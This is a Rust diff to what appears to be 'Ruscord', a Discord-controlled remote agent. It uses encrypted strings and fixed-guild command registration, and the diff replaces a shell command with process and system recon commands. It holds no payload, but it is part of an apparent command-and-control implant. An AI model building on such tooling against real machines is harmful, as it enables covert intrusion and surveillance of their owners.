@@ -1,6 +1,6 @@
 use std::{net::IpAddr, process::Stdio, sync::Arc};
 
-use commands::utils::{clear, help};
+use commands::{recon, utils};
 use config::AgentConfig;
 use constants::RUSCORD_GUILD_ID;
 use poise::serenity_prelude::{self as serenity, futures::StreamExt};
@@ -16,6 +16,7 @@ use tracing_subscriber::EnvFilter;
 mod commands;
 mod config;
 mod os;
+pub const MAX_DISCORD_CHARS: usize = 2000;
 
 #[macro_use]
 extern crate litcrypt2;
@@ -26,7 +27,9 @@ pub mod constants {
 }
 
 pub struct Data {
-	pub config: Mutex<AgentConfig>,
+	pub config:              Mutex<AgentConfig>,
+	pub initialization_time: tokio::time::Instant,
+	pub os_module:           crate::os::OsModule,
 }
 
 pub type RuscordError = Box<dyn std::error::Error + Send + Sync>;
@@ -121,7 +124,7 @@ async fn main() {
 				prefix: Some("!".into()),
 				..Default::default()
 			},
-			commands: vec![shell(), help(), clear()],
+			commands: vec![utils::clear(), utils::help(), recon::agent_info(), recon::processes()],
 			event_handler: |ctx, event, framework, data| Box::pin(event_handler(ctx, event, framework, data)),
 			command_check: Some(|ctx| {
 				Box::pin(async move {
@@ -138,7 +141,9 @@ async fn main() {
 				let agent_config = AgentConfig::load_config(ctx).await?;
 				poise::builtins::register_in_guild(ctx, &framework.options().commands, RUSCORD_GUILD_ID).await?;
 				Ok(Data {
-					config: Mutex::new(agent_config),
+					config:              Mutex::new(agent_config),
+					initialization_time: tokio::time::Instant::now(),
+					os_module:           crate::os::OsModule::default(),
 				})
 			})
 		})
